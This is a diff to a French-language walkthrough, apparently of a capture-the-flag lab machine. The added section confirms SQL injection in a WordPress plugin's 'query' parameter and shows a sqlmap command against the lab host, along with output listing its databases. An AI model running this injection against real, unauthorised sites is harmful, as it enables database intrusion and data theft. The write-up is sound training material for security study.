@@ -122,7 +122,28 @@ Essayons de générer une erreur SQL via le paramètre query :
 
 ![error_sql](https://i.imgur.com/EEfQJrb.png)
 
+Nous sommes maintenant certain qu'une injection SQL est possible. Sortons [sqlmap](https://github.com/sqlmapproject/sqlmap) ! 😄
 
+```py
+❯ sqlmap -u http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php\?query\=1337 --dbs
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.4.12#stable}
+|_ -| . [(]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[...]
+available databases [8]:
+[*] information_schema
+[*] joomla
+[*] joomladb
+[*] mysql
+[*] performance_schema
+[*] sys
+[*] wordpress
+[*] wordpressdb
+```
 
 # Vertical Privilege Escalation
 
